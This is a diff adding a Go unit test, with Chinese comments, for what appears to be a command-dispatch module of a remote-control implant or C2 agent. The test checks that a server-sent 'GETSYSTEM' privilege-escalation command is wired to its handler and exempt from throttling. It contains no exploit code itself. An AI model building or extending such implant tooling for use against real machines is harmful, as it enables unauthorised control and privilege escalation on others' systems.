@@ -22,3 +22,26 @@ func TestFileContentDispatched(t *testing.T) {
 		t.Error("dispatch.go 的 FileContent 分支没有调用 commands.CmdFileContent")
 	}
 }
+
+// TestGetSystemDispatched 守卫提权命令的接线。
+// 与 cmdType 19 同类问题：types.go 定义了常量、服务端前缀表能下发，
+// 但 dispatch.go 少一个 case 就变成"下发后一律回 not supported"。
+// 提权还额外要求**跳过节流**（见下面的豁免名单断言）：提权动作对时序敏感，
+// 被 WaitTime 拖住会让"执行了但半天没反应"。
+func TestGetSystemDispatched(t *testing.T) {
+	src, err := os.ReadFile("dispatch.go")
+	if err != nil {
+		t.Fatalf("读取 dispatch.go 失败: %v", err)
+	}
+	body := string(src)
+	if !strings.Contains(body, "case services.GETSYSTEM:") {
+		t.Error("dispatch.go 缺少 `case services.GETSYSTEM:` —— 提权命令会被回 not supported")
+	}
+	if !strings.Contains(body, "commands.CmdGetSystem(cmdBuf)") {
+		t.Error("dispatch.go 的 GETSYSTEM 分支没有调用 commands.CmdGetSystem")
+	}
+	// 节流豁免：豁免名单里必须出现 GETSYSTEM
+	if !strings.Contains(body, "cmdType != services.GETSYSTEM") {
+		t.Error("dispatch.go 的命令节流豁免名单缺少 GETSYSTEM —— 提权会被 WaitTime 拖住")
+	}
+}
